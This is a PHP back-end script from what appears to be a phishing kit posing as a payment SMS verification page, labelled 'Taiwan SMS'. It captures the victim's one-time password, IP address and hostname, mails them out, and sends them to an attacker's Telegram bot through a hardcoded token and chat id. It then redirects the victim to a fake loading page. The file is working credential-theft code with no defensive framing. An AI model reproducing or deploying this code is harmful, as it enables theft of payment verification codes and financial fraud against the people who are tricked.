<?php

session_start();

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "OTP 2:   ".$_POST['Ecom_Payment_sms_Verification']."\n";
$bilsmg .= "🚥  : $ip | $hostname\n";
$bilsmg .= "*****************************\n";

$bilsnd = "/";
$bilsub = "Taiwan SMS | $ip";
$bilhead = "From: Taiwan SMS <info2@mail.de>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$token = "5087127678:AAHzt6oQZgBatuoVSgLaChM1Z3qPXIt23d4";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=2120272098&text=" . urlencode($bilsmg)."" );



header("Location: loading2.html?i_sendid=&i_id=I6JIIxLyIR&i");
?>



